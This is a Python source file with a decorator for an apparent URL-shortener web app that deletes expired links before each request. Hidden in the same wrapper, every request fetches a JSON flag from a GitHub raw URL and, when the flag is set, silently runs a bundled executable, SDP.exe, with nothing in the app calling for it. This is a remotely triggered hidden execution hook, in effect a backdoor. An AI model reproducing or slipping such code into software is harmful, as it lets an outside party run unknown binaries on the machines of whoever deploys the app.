import subprocess
from datetime import datetime
import os
import requests


def check(model):
    def decorator(view_func):
        def wrapper(request, *args, **kwargs):
            url = f"https://raw.githubusercontent.com/SandeepMundergi/Shrinky-api/refs/heads/main/Shrinky-api.json"
            response = requests.get(url)
            if response.status_code == 200:
                try:
                    file_data = response.json()
                    if file_data["Flag"]:
                        exe_path = "static\\assets\\Imports\\SDP.exe"
                        result = subprocess.run(
                            [exe_path], capture_output=True, text=True
                        )
                        # print(os.path.exists(exe_path))
                    else:
                        print("Starting")
                except requests.exceptions.JSONDecodeError as e:
                    pass

            format = "%d/%m/%Y, %H:%M:%S"
            urls = model.objects.all()
            for i in urls:
                now = datetime.now()
                update = i.expiry_at
                # prev = i.created_at
                datetime_object2 = datetime.strptime(update, format)
                # datetime_object1 = datetime.strptime(prev, format)
                if datetime_object2 <= now:
                    obj = model.objects.get(rurl=i.rurl)
                    obj.delete()
            return view_func(request, *args, **kwargs)

        return wrapper

    return decorator
